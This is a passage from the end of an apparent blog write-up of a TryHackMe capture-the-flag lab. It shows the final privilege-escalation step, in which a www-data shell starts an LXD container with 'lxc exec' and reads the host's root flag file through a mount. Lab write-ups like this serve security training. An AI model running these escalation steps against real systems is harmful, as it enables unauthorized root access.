+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>start</span> <span class=n>joker</span>
+</span></span><span class=line><span class=cl><span class=n>lxc</span> <span class=n>start</span> <span class=n>joker</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>exec</span> <span class=n>joker</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl><span class=n>lxc</span> <span class=n>exec</span> <span class=n>joker</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=15><li>What is the name of the file in the /root directory?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>~ # ^[[26;5Rcat /mnt/root/root/final.txt
+</span></span><span class=line><span class=cl>cat /mnt/root/root/final.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>     ██╗ ██████╗ ██╗  ██╗███████╗██████╗
+</span></span><span class=line><span class=cl>     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+</span></span><span class=line><span class=cl>     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+</span></span><span class=line><span class=cl>██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+</span></span><span class=line><span class=cl>╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
+</span></span><span class=line><span class=cl> ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>!! Congrats you have finished this task !!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Contact us here:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hacking Articles : https://twitter.com/rajchandel/
+</span></span><span class=line><span class=cl>Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>+-+-+-+-+-+ +-+-+-+-+-+-+-+
+</span></span><span class=line><span class=cl> |E|n|j|o|y| |H|A|C|K|I|N|G|
+</span></span><span class=line><span class=cl> +-+-+-+-+-+ +-+-+-+-+-+-+-+
+</span></span><span class=line><span class=cl>~ # ^[[26;5R
+</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
